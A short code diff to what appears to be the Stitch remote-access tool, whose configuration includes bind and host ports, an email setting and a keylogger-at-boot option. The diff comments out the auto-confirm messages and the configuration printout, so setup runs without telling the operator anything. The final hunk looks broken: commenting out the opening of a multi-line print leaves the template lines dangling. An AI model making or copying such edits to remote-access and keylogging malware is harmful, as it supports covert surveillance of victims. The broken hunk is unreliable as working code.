@@ -151,7 +151,7 @@ def confirm_config(auto_confirm=False):
     auto_confirm_env = os.getenv('STITCH_AUTO_CONFIRM', 'false').lower() in ('true', '1', 'yes')
     
     if auto_confirm or auto_confirm_env:
-        print("Auto-confirming configuration (non-interactive mode)")
+    # print("Auto-confirming configuration (non-interactive mode)")
         return True
     
     try:
@@ -164,7 +164,7 @@ def confirm_config(auto_confirm=False):
             return False
     except (EOFError, KeyboardInterrupt):
         # Handle non-interactive environments
-        print("Non-interactive environment detected, using current configuration")
+    # print("Non-interactive environment detected, using current configuration")
         return True
 
 def get_conf_dir():
@@ -195,8 +195,8 @@ def print_st_config():
 
     EMAIL = stini.get_value("EMAIL")
     KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
-    st_print("=== Stitch {} Configuration ===".format(stini.section))
-    print('''
+    # st_print("=== Stitch {} Configuration ===".format(stini.section))
+    # print('''
     BIND = {}
     BHOST = {}
     BPORT = {}
